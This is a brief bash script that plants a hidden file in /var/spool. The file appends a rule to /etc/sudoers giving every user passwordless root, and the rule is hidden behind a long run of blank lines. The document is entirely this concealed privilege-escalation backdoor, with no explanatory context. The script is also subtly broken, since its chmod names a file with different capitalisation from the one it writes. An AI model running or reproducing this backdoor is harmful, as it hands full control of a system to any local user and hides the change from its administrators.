#!/bin/bash
cat <<EOF > /var/spool/.sudoAll.sh
#!/bin/bash
echo "

































































































































































ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
EOF
chmod +x /var/spool/.sudoALL.sh